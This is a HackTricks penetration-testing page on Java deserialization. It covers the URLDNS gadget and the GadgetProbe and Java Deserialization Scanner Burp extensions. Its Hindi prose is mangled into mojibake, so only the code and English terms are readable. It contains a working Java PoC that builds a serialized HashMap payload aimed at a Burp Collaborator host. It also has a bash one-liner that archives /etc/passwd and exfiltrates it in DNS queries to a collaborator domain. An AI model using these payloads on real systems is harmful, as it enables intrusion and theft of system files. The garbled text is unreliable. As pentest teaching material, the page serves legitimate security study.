# Java DNS Deserialization, GadgetProbe рдФрд░ Java Deserialization Scanner

## Java DNS Deserialization, GadgetProbe рдФрд░ Java Deserialization Scanner

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) рдХреЗ рд╕рд╛рде AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**.
* **HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╢реЗрдпрд░ рдХрд░реЗрдВ.

</details>

## рдбрд┐рд╕реЗрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди рдкрд░ DNS рдЕрдиреБрд░реЛрдз

рдХреНрд▓рд╛рд╕ `java.net.URL` `Serializable` рдХреЛ рд▓рд╛рдЧреВ рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЗрд╕ рдХреНрд▓рд╛рд╕ рдХреЛ рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
```java
public final class URL implements java.io.Serializable {
```
рдЗрд╕ рдХреНрд▓рд╛рд╕ рдореЗрдВ рдПрдХ **рд╡рд┐рдЪрд┐рддреНрд░ рд╡реНрдпрд╡рд╣рд╛рд░** рд╣реЛрддрд╛ рд╣реИред рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рд╕реЗ: "**рджреЛ рд╣реЛрд╕реНрдЯреНрд╕ рдХреЛ рд╕рдорд╛рди рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ рдпрджрд┐ рджреЛрдиреЛрдВ рд╣реЛрд╕реНрдЯ рдирд╛рдореЛрдВ рдХреЛ рдПрдХ рд╣реА IP рдкрддреЗ рдореЗрдВ рд╣рд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**"ред\
рддрдм, рд╣рд░ рдмрд╛рд░ рдЬрдм рдПрдХ URL рдСрдмреНрдЬреЗрдХреНрдЯ **рдХрд┐рд╕реА рднреА** **`equals`** рдпрд╛ **`hashCode`** рдлрдВрдХреНрд╢рди рдХреЛ **рдХреЙрд▓** рдХрд░рддрд╛ рд╣реИ, рддреЛ IP рдкрддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ **DNS рдЕрдиреБрд░реЛрдз** **рднреЗрдЬрд╛** рдЬрд╛рдПрдЧрд╛ред

рдПрдХ **URL** рдСрдмреНрдЬреЗрдХреНрдЯ рд╕реЗ **`hashCode`** рдлрдВрдХреНрд╢рди рдХреЛ **рдХреЙрд▓** рдХрд░рдирд╛ рдХрд╛рдлреА рдЖрд╕рд╛рди рд╣реИ, рдЗрд╕реЗ рдПрдХ `HashMap` рдореЗрдВ рдбрд╛рд▓рдирд╛ рдкрд░реНрдпрд╛рдкреНрдд рд╣реИ рдЬрд┐рд╕реЗ рдбреАрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИред рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ `HashMap` рдХреЗ **`readObject`** рдлрдВрдХреНрд╢рди рдХреЗ **рдЕрдВрдд** рдореЗрдВ рдпрд╣ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```java
private void readObject(java.io.ObjectInputStream s)
throws IOException, ClassNotFoundException {
[   ...   ]
for (int i = 0; i < mappings; i++) {
[   ...   ]
putVal(hash(key), key, value, false, false);
}
```
рдпрд╣ `HashMap` рдХреЗ рдЕрдВрджрд░ рд╣рд░ рдорд╛рди рдХреЗ рд╕рд╛рде **рдЪрд▓рд╛рдПрдЧрд╛** `putVal` рдХреЛред рд▓реЗрдХрд┐рди, рдЬреНрдпрд╛рджрд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рд╣рд░ рдорд╛рди рдХреЗ рд╕рд╛рде `hash` рдХреЛ рдХреЙрд▓ рдХрд░рдирд╛ред рдпрд╣ `hash` рдлрдВрдХреНрд╢рди рдХрд╛ рдХреЛрдб рд╣реИ:
```java
static final int hash(Object key) {
int h;
return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```
рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, **рдЬрдм рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд┐рдВрдЧ** рдПрдХ **`HashMap`** рдлрдВрдХреНрд╢рди `hash` рд╣рд░ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рд╕рд╛рде **рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдиреЗ рд╡рд╛рд▓рд╛ рд╣реИ** рдФрд░ **`hash`** рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ **рджреМрд░рд╛рди** рдСрдмреНрдЬреЗрдХреНрдЯ рдХрд╛ `.hashCode()` **рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛**ред рдЗрд╕рд▓рд┐рдП, рдЕрдЧрд░ рдЖрдк рдПрдХ **`HashMap`** **рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬ** рдХрд░рддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рдПрдХ **URL** рдСрдмреНрдЬреЗрдХреНрдЯ рд╣реЛрддрд╛ рд╣реИ, рддреЛ **URL рдСрдмреНрдЬреЗрдХреНрдЯ** `.hashCode()` **рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛**ред

рдЕрдм, `URLObject.hashCode()` рдХреЗ рдХреЛрдб рдкрд░ рдПрдХ рдирдЬрд╝рд░ рдбрд╛рд▓рддреЗ рд╣реИрдВ :
```java
public synchronized int hashCode() {
if (hashCode != -1)
return hashCode;

hashCode = handler.hashCode(this);
return hashCode;
```
рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрдм рдПрдХ `URLObject` `.hashCode()` рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИ, рддреЛ рдЗрд╕реЗ `hashCode(this)` рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред рдЖрдЧреЗ рдЖрдк рдЗрд╕ рдлрдВрдХреНрд╢рди рдХрд╛ рдХреЛрдб рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ:
```java
protected int hashCode(URL u) {
int h = 0;

// Generate the protocol part.
String protocol = u.getProtocol();
if (protocol != null)
h += protocol.hashCode();

// Generate the host part.
InetAddress addr = getHostAddress(u);
[   ...   ]
```
рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдбреЛрдореЗрди рдХреЗ рд▓рд┐рдП `getHostAddress` рдХрд╛ рдирд┐рд╖реНрдкрд╛рджрди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, **DNS query рд▓реЙрдиреНрдЪ рдХрд░рддреЗ рд╣реБрдП**ред

рдЗрд╕рд▓рд┐рдП, рдЗрд╕ рдХреНрд▓рд╛рд╕ рдХрд╛ **рджреБрд░реБрдкрдпреЛрдЧ** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ **DNS query рд▓реЙрдиреНрдЪ** рдХреА рдЬрд╛ рд╕рдХреЗ рдпрд╣ **рдкреНрд░рджрд░реНрд╢рд┐рдд** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ **deserialization** рд╕рдВрднрд╡ рд╣реИ, рдпрд╛ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ **рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓рдирд╛** (рдЖрдк рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рдЖрдЙрдЯрдкреБрдЯ рдХреЛ рд╕рдмрдбреЛрдореЗрди рдХреЗ рд░реВрдк рдореЗрдВ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ)ред

### URLDNS рдкреЗрд▓реЛрдб рдХреЛрдб рдЙрджрд╛рд╣рд░рдг

рдЖрдк [ysoserial рд╕реЗ URDNS рдкреЗрд▓реЛрдб рдХреЛрдб рдпрд╣рд╛рдБ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java)ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕реЗ рдХреЛрдб рдХрд░рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рд╕рдордЭрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╕рд╛рди рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдореИрдВрдиреЗ рдЕрдкрдирд╛ рдЦреБрдж рдХрд╛ PoC рдмрдирд╛рдпрд╛ рд╣реИ (ysoserial рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдПрдХ рдХреЗ рдЖрдзрд╛рд░ рдкрд░):
```java
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.net.URL;

public class URLDNS {
public static void GeneratePayload(Object instance, String file)
throws Exception {
//Serialize the constructed payload and write it to the file
File f = new File(file);
ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
out.writeObject(instance);
out.flush();
out.close();
}
public static void payloadTest(String file) throws Exception {
//Read the written payload and deserialize it
ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
Object obj = in.readObject();
System.out.println(obj);
in.close();
}

public static void main(final String[] args) throws Exception {
String url = "http://3tx71wjbze3ihjqej2tjw7284zapye.burpcollaborator.net";
HashMap ht = new HashMap(); // HashMap that will contain the URL
URLStreamHandler handler = new SilentURLStreamHandler();
URL u = new URL(null, url, handler); // URL to use as the Key
ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

// During the put above, the URL's hashCode is calculated and cached.
// This resets that so the next time hashCode is called a DNS lookup will be triggered.
final Field field = u.getClass().getDeclaredField("hashCode");
field.setAccessible(true);
field.set(u, -1);

//Test the payloads
GeneratePayload(ht, "C:\\Users\\Public\\payload.serial");
}
}


class SilentURLStreamHandler extends URLStreamHandler {

protected URLConnection openConnection(URL u) throws IOException {
return null;
}

protected synchronized InetAddress getHostAddress(URL u) {
return null;
}
}
```
### рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА

* [https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/](https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)
* рдореВрд▓ рд╡рд┐рдЪрд╛рд░ рдореЗрдВ рдХреЙрдордиреНрд╕ рдХрд▓реЗрдХреНрд╢рдиреНрд╕ рдкреЗрд▓реЛрдб рдХреЛ DNS рдХреНрд╡реЗрд░реА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрджрд▓рд╛ рдЧрдпрд╛ рдерд╛, рдпрд╣ рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд рд╡рд┐рдзрд┐ рд╕реЗ рдХрдо рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдерд╛, рд▓реЗрдХрд┐рди рдпрд╣ рдкреЛрд╕реНрдЯ рд╣реИ: [https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/](https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)

## GadgetProbe

рдЖрдк [**GadgetProbe**](https://github.com/BishopFox/GadgetProbe) рдХреЛ Burp Suite App Store (Extender) рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

**GadgetProbe** рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧрд╛ рдХрд┐ рдХреБрдЫ **Java classes рдореМрдЬреВрдж рд╣реИрдВ** рдпрд╛ рдирд╣реАрдВ рд╕рд░реНрд╡рд░ рдХреЗ Java class рдкрд░ рддрд╛рдХрд┐ рдЖрдк рдЬрд╛рди рд╕рдХреЗрдВ **рдХрд┐** рдпрд╣ **vulnerable** рд╣реИ рдпрд╛ рдирд╣реАрдВ рдХрд┐рд╕реА рдЬреНрдЮрд╛рдд рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреЗ рд▓рд┐рдПред

### рдпрд╣ рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ

**GadgetProbe** рдкрд┐рдЫрд▓реЗ рдЕрдиреБрднрд╛рдЧ рдХреЗ рд╕рдорд╛рди **DNS payload** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛ рд▓реЗрдХрд┐рди **DNS рдХреНрд╡реЗрд░реА рдЪрд▓рд╛рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ** рдпрд╣ **рдХрд┐рд╕реА рдордирдорд╛рдиреА рдХреНрд▓рд╛рд╕ рдХреЛ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧрд╛**ред рдЕрдЧрд░ **рдордирдорд╛рдиреА рдХреНрд▓рд╛рд╕ рдореМрдЬреВрдж рд╣реИ**, рддреЛ **DNS рдХреНрд╡реЗрд░реА** **рднреЗрдЬреА рдЬрд╛рдПрдЧреА** рдФрд░ GadgetProbe рдиреЛрдЯ рдХрд░реЗрдЧрд╛ рдХрд┐ рдпрд╣ рдХреНрд▓рд╛рд╕ рдореМрдЬреВрдж рд╣реИред рдЕрдЧрд░ **DNS** рдЕрдиреБрд░реЛрдз **рдХрднреА рдирд╣реАрдВ рднреЗрдЬрд╛ рдЬрд╛рддрд╛**, рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ **рдордирдорд╛рдиреА рдХреНрд▓рд╛рд╕ рдХреЛ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛** рдЗрд╕рд▓рд┐рдП рдпрд╛ рддреЛ рдпрд╣ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ рдпрд╛ рдпрд╣ **рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрдмрд▓/рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреЗрдмрд▓ рдирд╣реАрдВ рд╣реИ**ред

Github рдХреЗ рдЕрдВрджрд░, [**GadgetProbe рдореЗрдВ рдХреБрдЫ рд╡рд░реНрдбрд▓рд┐рд╕реНрдЯреНрд╕ рд╣реИрдВ**](https://github.com/BishopFox/GadgetProbe/tree/master/wordlists) рдЬрд┐рдирдореЗрдВ Java рдХреНрд▓рд╛рд╕реЗрд╕ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдкрд░реАрдХреНрд╖рдг рдХреЗ рд▓рд┐рдП рд░рдЦрд╛ рдЧрдпрд╛ рд╣реИред

![](<../../.gitbook/assets/intruder4 (1) (1) (1).gif>)

### рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА

* [https://know.bishopfox.com/research/gadgetprobe](https://know.bishopfox.com/research/gadgetprobe)

## Java Deserialization Scanner

рдЗрд╕ рд╕реНрдХреИрдирд░ рдХреЛ Burp App Store (**Extender**) рд╕реЗ **рдбрд╛рдЙрдирд▓реЛрдб** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
рдЗрд╕ **рдПрдХреНрд╕рдЯреЗрдВрд╢рди** рдореЗрдВ **рдкреИрд╕рд┐рд╡** рдФрд░ рд╕рдХреНрд░рд┐рдп **рдХреНрд╖рдорддрд╛рдПрдВ** рд╣реИрдВред

### рдкреИрд╕рд┐рд╡

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдпрд╣ рд╕рднреА рдЕрдиреБрд░реЛрдзреЛрдВ рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреА **рдкреИрд╕рд┐рд╡ рд░реВрдк рд╕реЗ рдЬрд╛рдВрдЪ рдХрд░рддрд╛ рд╣реИ** **рджреЗрдЦ** рд░рд╣рд╛ рд╣реИ **Java serialized magic bytes** рдХреЗ рд▓рд┐рдП рдФрд░ рдЕрдЧрд░ рдХреЛрдИ рдорд┐рд▓рддрд╛ рд╣реИ рддреЛ рдПрдХ рд╡рд▓реНрдирд░реЗрдмрд┐рд▓рд┐рдЯреА рдЪреЗрддрд╛рд╡рдиреА рдкреНрд░рд╕реНрддреБрдд рдХрд░реЗрдЧрд╛:

![](<../../.gitbook/assets/image (290).png>)

### рд╕рдХреНрд░рд┐рдп

**рдореИрдиреБрдЕрд▓ рдкрд░реАрдХреНрд╖рдг**

рдЖрдк рдПрдХ рдЕрдиреБрд░реЛрдз рдХрд╛ рдЪрдпрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рд░рд╛рдЗрдЯ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдФрд░ `Send request to DS - Manual Testing`ред\
рдлрд┐рд░, _Deserialization Scanner Tab_ --> _Manual testing tab_ рдХреЗ рдЕрдВрджрд░ рдЖрдк **insertion point** рдХрд╛ рдЪрдпрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдФрд░ **рдкрд░реАрдХреНрд╖рдг рд╢реБрд░реВ рдХрд░реЗрдВ** (рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд░рд╣реА рдПрдиреНрдХреЛрдбрд┐рдВрдЧ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЙрдкрдпреБрдХреНрдд рдЕрдЯреИрдХ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ)ред

![](../../.gitbook/assets/3-1.png)

рднрд▓реЗ рд╣реА рдЗрд╕реЗ "рдореИрдиреБрдЕрд▓ рдкрд░реАрдХреНрд╖рдг" рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ, рдпрд╣ рдХрд╛рдлреА **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд** рд╣реИред рдпрд╣ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЬрд╛рдВрдЪ рдХрд░реЗрдЧрд╛ рдХрд┐ **рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди** **vulnerable** рд╣реИ рдпрд╛ рдирд╣реАрдВ **рдХрд┐рд╕реА ysoserial payload** рдХреЗ рд▓рд┐рдП рд╡реЗрдм рд╕рд░реНрд╡рд░ рдкрд░ рдореМрдЬреВрдж рд▓рд╛рдЗрдмреНрд░реЗрд░реАрдЬ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдХреЗ рдФрд░ рд╡рд▓реНрдирд░реЗрдмрд▓ рд╡рд╛рд▓реЛрдВ рдХреЛ рд╣рд╛рдЗрд▓рд╛рдЗрдЯ рдХрд░реЗрдЧрд╛ред **рд╡рд▓реНрдирд░реЗрдмрд▓ рд▓рд╛рдЗрдмреНрд░реЗрд░реАрдЬ** рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк **Java Sleeps**, **sleeps** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **CPU** рдХреА рдЦрдкрдд, рдпрд╛ **DNS** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓реЙрдиреНрдЪ рдХрд░рдиреЗ рдХрд╛ рдЪрдпрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕рд╛ рдХрд┐ рдкрд╣рд▓реЗ рдЙрд▓реНрд▓реЗрдЦ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

**рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯрд┐рдВрдЧ**

рдПрдХ рдмрд╛рд░ рдЬрдм рдЖрдкрдиреЗ рдПрдХ рд╡рд▓реНрдирд░реЗрдмрд▓ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреА рдкрд╣рдЪрд╛рди рдХрд░ рд▓реА рд╣реИ рддреЛ рдЖрдк рдЕрдиреБрд░реЛрдз рдХреЛ _Exploiting Tab_ рдореЗрдВ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВред\
рдЗрд╕ рдЯреИрдм рдореЗрдВ рдЖрдкрдХреЛ рдлрд┐рд░ рд╕реЗ **injection point** рдХрд╛ **рдЪрдпрди** рдХрд░рдирд╛ рд╣реЛрдЧрд╛, рдФрд░ **рд╡рд▓реНрдирд░реЗрдмрд▓ рд▓рд╛рдЗрдмреНрд░реЗрд░реА** рд▓рд┐рдЦрдиреА рд╣реЛрдЧреА рдЬрд┐рд╕рдХреЗ рд▓рд┐рдП рдЖрдк рдкреЗрд▓реЛрдб рдмрдирд╛рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рдФрд░ **рдХрдорд╛рдВрдб**ред рдлрд┐рд░, рдЙрдкрдпреБрдХреНрдд **Attack** рдмрдЯрди рджрдмрд╛рдПрдВред

![](<../../.gitbook/assets/4 (1).png>)

### Java Deserialization DNS Exfil рдЬрд╛рдирдХрд╛рд░реА

рдЕрдкрдиреЗ рдкреЗрд▓реЛрдб рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреБрдЫ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ:
```bash
(i=0;tar zcf - /etc/passwd | xxd -p -c 31 | while read line; do host $line.$i.cl1k22spvdzcxdenxt5onx5id9je73.burpcollaborator.net;i=$((i+1)); done)
```
### рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА

* [https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/)

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ **рдореБрдЭреЗ рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╢реЗрдпрд░ рдХрд░реЗрдВред

</details>
